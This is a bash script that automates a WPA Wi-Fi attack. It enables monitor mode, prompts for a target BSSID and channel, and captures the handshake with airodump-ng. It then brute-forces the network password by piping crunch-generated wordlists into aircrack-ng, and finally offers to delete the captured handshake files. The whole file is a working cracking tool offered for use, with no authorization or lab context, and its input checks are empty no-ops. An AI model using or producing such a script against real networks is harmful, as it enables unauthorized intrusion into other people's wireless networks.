#!/bin/bash

HANDSHAKE='/tmp/handshake/*.cap'
airmon-ng 
echo "type is not start wlan0:"
echo ""
read SMOD
[[ $SMOD == "" ]]
airmon-ng start $SMOD
clear
airmon-ng
echo "Please enter the WLAN* MOD:"
echo ""
read MOD
[[ $MOD == "" ]]
airodump-ng  $MOD 
echo "Please enter the BSSID:"
echo ""
read BSSID
[[ $BSSID == "" ]]
echo "Please enter the network channel:"
echo ""
read CHNEL
[[ $CHNEL == "" ]]
mkdir /tmp/handshake

airodump-ng -c $CHNEL  --bssid $BSSID  $MOD -w /tmp/handshake/$BSSID

echo "========Press enter to continue Crunch & Password========"
read START
if [[ $START == "" ]]; then
clear
fi
echo "Please enter the Password the crunch:"
echo "-t (@)lower (,)upper (%)numbers (^)symbols hide opsh"
#crunch min max (-f Num%) (- -t @,%^
#Specifies a pattern, eg: @@god@@@@ where the only the @s
#will change.
#@ will insert lower case characters
#, will insert upper case characters
#% will insert numbers
#^ will insert symbols
echo ""
read PASS
[[ $PASS == "" ]]
echo "Please enter the Password the size Min:"
echo ""
read INS
[[ $INS == "" ]]
echo "Please enter the Password the size Max:"
echo ""
read END
[[ $END == "" ]]
ls -la /tmp/handshake/ | grep .cap
sleep 3
#echo "Please enter select *CAP:"
#echo ""
#read CAP
#[[ $CAP == "" ]]
crunch $INS $END $PASS | aircrack-ng -b $BSSID -w - $HANDSHAKE
echo "========are your remove history file handshake [Enter remove]========"
echo "============[Enter / remove]===========[Caps + C / Cancel]==========="
read START
if [[ $START == "" ]]; then
rm -fr /tmp/handshake/*
fi
clear
